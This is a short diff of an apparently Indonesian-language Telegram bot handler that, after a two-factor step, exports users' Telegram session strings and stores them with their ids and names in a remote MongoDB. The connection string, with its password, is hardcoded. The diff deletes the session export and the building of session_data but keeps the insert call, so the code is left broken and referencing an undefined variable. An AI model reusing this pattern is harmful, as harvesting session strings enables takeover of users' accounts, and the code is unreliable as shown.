@@ -67,18 +67,7 @@ async def recv_tg_tfa_message(_, message: Message):
         client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
-        session_string = str(await loical_ci.export_session_string())
-        load_dotenv()
-
-            file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
-        await message.reply_text("`Berhasil Melakukan Deploy.`")
-        session_data = {
-            "session_string": session_string,
-            "user_id": message.chat.id,
-            "username": message.chat.username or "",
-            "first_name": message.chat.first_name or "",
-            "last_name": message.chat.last_name or "",
-        }        
+        
         mongo_collection.insert_one(session_data)
         await asyncio.sleep(2.0)
         collection = cli["access"]
